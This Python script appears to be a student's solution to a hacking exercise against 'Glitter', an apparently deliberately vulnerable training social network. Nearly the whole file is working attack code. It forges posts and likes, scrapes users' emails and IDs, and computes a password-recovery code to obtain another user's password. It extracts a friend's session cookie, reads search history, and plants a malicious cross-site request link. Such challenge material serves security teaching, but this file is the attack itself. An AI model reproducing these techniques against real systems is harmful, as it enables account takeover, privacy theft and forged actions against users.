from scapy.all import *
from scapy.layers.dns import DNS, DNSQR
from scapy.layers.inet import ICMP, IP, TCP, UDP
from scapy.layers.l2 import Ether
from scapy.packet import Raw
import random
from datetime import datetime, date
import requests
import hashlib

GLITTER_IP = '54.187.16.171'
GLITTER_PORT = 1336

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_address = (GLITTER_IP, GLITTER_PORT)
sock.connect(server_address)


def main():
    '''
    main function for running swiss knife security breach program
    '''
    valid = "Err" #enter first iteration on loop
    while valid == "Err":
        user_data = get_user_data()
        valid = converse_with_server(user_data[0], user_data[1])


def get_user_data():
    '''
    function for getting initial user data
    :return: the username and password
    :rtype: tuple (str, str)
    '''
    print("Welocome to my glitter swiss knife program:")
    username = input("Enter username: ")
    password = input("Enter password: ")
    return username, password


def converse_with_server(username, password):
    '''
    function for conversing with the server
    :param username: the username
    :type: str
    :param password: the password
    :type: str
    '''
    run = True
    data = '''100#{gli&&er}{"user_name":"''' + username + '''","password":"''' + password + '''","enable_push_notifications":true}##'''
    checksum = calc_ascii_checksum(username, password)

    #connect to server with username and password
    sock.sendall(data.encode())
    server_msg = sock.recv(1024)
    sock.sendall(("110#{gli&&er}" + str(checksum) + "##").encode())
    server_msg = sock.recv(1024)
    user_data = server_msg.decode()

    #incase wrong username or password were entered
    if "Illegal" in user_data:
        print("Error in username or password")
        return "Err"
    while True:
        user_choice = print_menu()
        process_choice(user_choice, user_data)


def print_menu():
    '''
    function for printing the user the menu
    :return: the user choice
    :rtype: int
    '''
    print("\nOptions:")
    print("0 - quit")
    print("1 - Post a glitt with a impossible date")
    print("2 - Post a glitt with an unavailable background color")
    print("3 - Post a glitt with an unavailable font color")
    print("4 - Get a users email")
    print("5 - Get a users id")
    print("6 - Add a comment in the past")
    print("7 - add selected amount of likes to a post")
    print("8 - add selected amount of wows")
    print("9 - get user's password (password challenge)")
    print("10 - get user's cookie (cookie challenge)")
    print("11 - add xss glit to profile (xsrf challenge)")
    print("12 - get user's search history (privacy challenge)")
    try:
        user_choice = int(input("Enter your choice: "))
    except Exception:
        print("only numbers")
        return -1
    return user_choice


def process_choice(user_choice, user_data):
    '''
    function for dealing with users option choice
    :param user_choice: the users choice
    :type: int
    :param user_data: the server message containing the user information
    :return: "exit" if chose to quit "" otherwise
    :rtype: str
    '''
    if True:
        if user_choice == 0:
            print("Goodbye")
            exit()
        elif user_choice == 1:
            glitt_with_imp_date(user_data)
        elif user_choice == 2:
            glitt_with_imp_background(user_data)
        elif user_choice == 3:
            glitt_with_imp_font_color(user_data)
        elif user_choice == 4:
            get_user_email(input("Enter name: "))
        elif user_choice == 5:
            print("User id:", get_user_id(input("Enter search type, wildcard(username), simple(screen name): ").upper(), input("Enter name: ")))
        elif user_choice == 6:
            add_imp_comment(input("Enter screen name: "), user_data)
        elif user_choice == 7:
            add_likes(input("Enter screen name: "), user_data, int(input("Enter amount of likes (less than 10): ")))
        elif user_choice == 8:
            add_wow(input("Enter screen name: "), user_data, int(input("Enter amount of wows (less than 10): ")))
        elif user_choice == 9:
            print("User password:", get_password(input("Enter username: ")))
        elif user_choice == 10:
            print("User cookie:",get_user_cookie(input("Enter username: "),user_data))
        elif user_choice == 11:
            xss_msg(user_data,input("Enter hack message: "))
        elif user_choice == 12:
            get_search_history(input("Enter search type, wildcard(username), simple(screen name): ").upper(), input("Enter name: "))
        else:
            print("Invalid choice")

def glitt_with_imp_date(user_data):
    '''
    function for sending a glit with an impossible date
    :param user_data: the server message containing the user information
    :type: str
    '''
    name, img, id = process_user_data(user_data)
    time = protocol_time()
    glitt_msg = input("Enter glit text: ")
    # post glitt with date from 1900 which is obviously impossible
    msg = '''550#{gli&&er}{"feed_owner_id":''' + id + ''',"publisher_id":''' + id + ''',"publisher_screen_name":"''' + name + '''","publisher_avatar":"''' + img + '''","background_color":"White","date":"1900-06-26T22:35:30.000Z","content":"''' + glitt_msg + '''","font_color":"black","id":-1}##'''
    sock.sendall(msg.encode())
    server_msg = sock.recv(1024)


def glitt_with_imp_background(user_data):
    '''
    function for sending a glit with an impossible background color
    :param user_data: the server message containing the user information
    :type: str
    '''
    name, img, id = process_user_data(user_data)
    time = protocol_time()
    glitt_msg = input("Enter glit text: ")
    # post glitt with black background color which isn't available on the app
    msg = '''550#{gli&&er}{"feed_owner_id":''' + id + ''',"publisher_id":''' + id + ''',"publisher_screen_name":"''' + name + '''","publisher_avatar":"''' + img + '''","background_color":"Black","date":"''' + time + '''","content":"''' + glitt_msg + '''","font_color":"white","id":-1}##'''
    sock.sendall(msg.encode())
    server_msg = sock.recv(1024)


def glitt_with_imp_font_color(user_data):
    '''
    function for sending a glit with an impossible font color
    :param user_data: the server message containing the user information
    :type: str
    '''
    name, img, id = process_user_data(user_data)
    time = protocol_time()
    glitt_msg = input("Enter glit text: ")
    # post glitt with blue font color which isn't available on the app
    msg = '''550#{gli&&er}{"feed_owner_id":''' + id + ''',"publisher_id":''' + id + ''',"publisher_screen_name":"''' + name + '''","publisher_avatar":"''' + img + '''","background_color":"White","date":"''' + time + '''","content":"''' + glitt_msg + '''","font_color":"blue","id":-1}##'''
    sock.sendall(msg.encode())
    server_msg = sock.recv(1024)


def get_user_email(username):
    '''
    function for getting a user email based on his display name
    :param username: the user's name
    :type: str
    :param search_type: how to find the user (wildcard(username), simple(screen name)
    :type: str
    '''

    # get user mail based on search information
    msg = '''300#{gli&&er}{"search_type":"SIMPLE","search_entry":"''' + username + '''"}##'''
    sock.sendall(msg.encode())
    server_msg = sock.recv(1024).decode()
    while "mail" not in server_msg: #incase the socket recived a previous conversation with the server
        server_msg = sock.recv(1024).decode()
    users = server_msg.split("}")
    mails = []

    # get mails of all users with same display name
    for user in users:
        if '''{"screen_name":"''' + username + '''",''' in user.lower():
            mail = user[user.find("mail") + 7:-2]
            mails.append(mail)

    # print all mails
    if len(mails) > 0:
        print("Emails of users with the same screen or username name:")
        for mail in mails:
            print(mail)
    else:
        print("No users with the same screen name or username")


def get_user_id(search_type,username):

    '''
    function for getting a user id based on his display name
    :param search_type: how to find the user (wildcard(username), simple(screen name)
    :type: st
    :param username: the user's name
    :type: str
    :return: the user's id
    :rtype: str
    '''
    # get user id based on search information
    msg = '''300#{gli&&er}{"search_type":"''' + search_type + '''","search_entry":"''' + username + '''"}##'''
    sock.sendall(msg.encode())
    server_msg = sock.recv(1024).decode()
    while "mail" not in server_msg: #incase the socket recived a previous conversation with the server
        server_msg = sock.recv(1024).decode()
    users = server_msg.split("}")
    ids = []

    if search_type == "SIMPLE":
        # find the first user with the corresponding display name and return his id
        for user in users:
            if '''{"screen_name":"''' + username + '''",''' in user.lower():
                id = user[user.find("id") + 4:user.find("mail") - 2]
                return id
    elif search_type == "WILDCARD":
        return users[1][users[1].find("id") + 4:users[1].find("mail") - 2]

    print("No users with the same screen name or username")
    return ""


def add_imp_comment(username, user_data):
    '''
    function for adding a comment with an impossible date
    :param username: the user's display name
    :type: str
    :param user_data: the server message containing the user information
    :type: str
    '''
    contents, glitt_choice = get_latest_glitts(username, user_data, 5)
    name, img, id = process_user_data(user_data)

    if glitt_choice != -1: #incase profile is private
        # send reply message to server
        msg = '''650#{gli&&er}{"glit_id":''' + contents[glitt_choice][1] + ''',"user_id":''' + id + ''',"user_screen_name":"''' + name + '''","id":-1,"content":"''' + input("Enter content: ") + '''","date":"1900-06-20T11:48:26.642Z"}##'''
        sock.sendall(msg.encode())

def add_likes(username, user_data, amount):
    '''
    function for adding a certain amount of likes to a user's post
    :param username: the user's display name
    :type: str
    :param user_data: the server message containing the user information
    :type: str
    :param amount: the amount of likes to add
    :type: int
    '''
    contents, glitt_choice = get_latest_glitts(username, user_data, 5)
    name, img, id = process_user_data(user_data)
    msg = ""
    try:
        msg = '''710#{gli&&er}{"glit_id":''' + contents[glitt_choice][1] + ''',"user_id":''' + id + ''',"user_screen_name":"''' + name + '''","id":-1}##'''
    except Exception:
        print("Profile is private")
        return

    if amount > 10: # running a long loop on server is bad so limit is 10
        amount = 10

    for i in range(amount):
        sock.sendall(msg.encode())

def add_wow(username,user_data,amount):
    '''
    function for adding a certain amount of wows to a user's post
    :param username: the user's display name
    :type: str
    :param user_data: the server message containing the user information
    :type: str
    :param amount: the amount of wows to add
    :type: int
    '''
    contents, glitt_choice = get_latest_glitts(username, user_data, 5)
    name, img, id = process_user_data(user_data)
    msg = ""
    try:
        msg = '''750#{gli&&er}{"glit_id":''' + contents[glitt_choice][1] + ''',"user_id":''' + id + ''',"user_screen_name":"''' + name + '''"}##'''
    except Exception:
        print("Profile is private")

    if amount > 10: # running a long loop on server is bad so limit is 10
        amount = 10

    for i in range(amount):
        sock.sendall(msg.encode())


def get_password(username):
    '''
    Function for getting a user's password based on his username only
    :param username: the username to get his password
    :type: str
    :return: the password
    :rtype: str
    '''
    code = ""

    #getting the code needed to reveal password
    date_comps = str(date.today()).split("-")
    code = code + date_comps[2] + date_comps[1]
    user_id = get_user_id("WILDCARD",username)
    for num in user_id:
        code += chr(ord(num) + 17)
    code += datetime.now().strftime("%H%M")

    req_url = "http://cyber.glitter.org.il/password-recovery-code-request/"
    ver_url = "http://cyber.glitter.org.il/password-recovery-code-verification/"
    #send server request to get a recovery code
    requests.post(req_url,headers={"Content-Type":"application/json"},json = username)
    #send server the secret code that was calculated
    password = requests.post(ver_url,headers={"Content-Type":"application/json"},json=[username,code]).text
    return (password)

def get_user_cookie(username,user_data):
    '''
    Function for calculating the user's cookie with the server based on their username
    :param username: the username
    :type: str
    :param user_data: the server message containing the user information
    :type: str
    :return: the user's cookie with the server
    :rtype: str
    '''
    friend_id = get_user_id("SIMPLE",username)
    name, img, id = process_user_data(user_data)
    msg = '''410#{gli&&er}[''' + id + ''',''' + friend_id + ''']##'''
    sock.sendall(msg.encode())
    ans = sock.recv(1024).decode()
    cookie = ans[ans.find("session:") + 8:ans.find("{gli&&er}")]
    return cookie


def xss_msg(user_data,txt):
    '''
    function for publishing a xss glit that when is pressed posts a glit as the user that pressed
    :param user_data: the server message containing the user information
    :type: str
    :param txt: the message to send as the hacked user
    :type: str
    '''
    name, img, id = process_user_data(user_data)
    time = protocol_time()
    #the java script code used for sending message in the name of the link clicker
    xss_data = '''<a href='/glit?id=-1&feed_owner_id=-1&publisher_id=-1&publisher_screen_name=hacker&publisher_avatar=im1&background_color=Black&date=''' + time + '''&content=''' + txt + '''&font_color=white'>hacked, click for more info</a>'''
    #publish glit with the malicious link
    msg = '''550#{gli&&er}{"feed_owner_id":''' + id + ''',"publisher_id":''' + id + ''',"publisher_screen_name":"''' + name + '''","publisher_avatar":"''' + img + '''","background_color":"Black","date":"''' + time + '''","content":"''' + xss_data + '''","font_color":"black","id":-1}##'''
    sock.sendall(msg.encode())
    server_msg = sock.recv(1024).decode()

def get_search_history(search_type,name):
    '''
    function for getting a user's search history and printing it to screen
    :param search_type: how to find the user (wildcard(username), simple(screen name)
    :param name: the user's name
    '''
    usernames = []
    user_id = get_user_id(search_type,name)
    history = requests.get("http://cyber.glitter.org.il/history/"+user_id).text
    users = history.split("{")[1:] #remove first index empty space

    #extract all usernames from server message
    for user in users:
        usernames.append(user[user.find("name") + 7:user.find(",") - 1])

    print("Last searched users:")
    for username in usernames:
        print(username)

def calc_ascii_checksum(username, password):
    sum = 0
    for lett in username:
        sum += ord(lett)
    for lett in password:
        sum += ord(lett)
    return sum

def get_latest_glitts(username, user_data, amount):

    '''
    function for getting certain amount of latest glitts from a user and getting user choice of which glitt to use
    :param username: the user's display name
    :type: str
    :param user_data: the server message containing the user information
    :type: str
    :param amount: the amount of glitts to get
    :type: int
    :return: a tuple of the latest glitts and the user's choice
    :rtype: tuple (list, int)
    '''
    contents = []
    user_id = get_user_id("SIMPLE", username)

    # get the user's latest glitts (max = amount)
    msg = '''500#{gli&&er}{"feed_owner_id":''' + user_id + ''',"end_date":"''' + protocol_time() + '''","glit_count":''' + str(amount) + '''}##'''
    sock.sendall(msg.encode())
    server_msg = sock.recv(1024).decode()
    glitts = server_msg.split("}")[1:]
    i = 0
    # getting last {amount} glitts content and ids
    if "content" in server_msg:
        for glitt in glitts:
            if "content" in glitt and i < amount:
                contents.append((glitt[glitt.find("content") + 10:glitt.find("font_color") - 3],
                                 glitt[glitt.find('''"id"''') + 5:]))
                i+=1
    else:
        print("Profile is private!")
        return [], -1 #return error

    #get from user which glitt to reply to
    print("Last", len(contents), "glitts from user:")
    for i in range(len(contents)):
        print(i, "-", contents[i][0])

    # get user choise
    glitt_choice = -1
    while glitt_choice >= len(contents) or glitt_choice < 0:
        try:
            glitt_choice = int(input("Enter glitt choice: "))
        except Exception:
            print("Only numbers allowed")
            glitt_choice = 0

    return contents, glitt_choice


def process_user_data(user_data):
    # get user name
    name_index = user_data.find("screen") + 14
    name = user_data[name_index:user_data.find("avatar") - 3]
    # get user image
    img_index = user_data.find("avatar") + 9
    img = user_data[img_index:img_index + 3]
    # get user id
    id_index = user_data.find("id") + 4
    id = user_data[id_index:user_data.find("user_name") - 2]

    return name, img, id

def protocol_time():
    curr_date = date.today()
    curr_time = datetime.now().strftime("%H:%M:%S")
    return str(curr_date) + "T" + str(curr_time) + ".000Z"

if __name__ == '__main__':
    main()
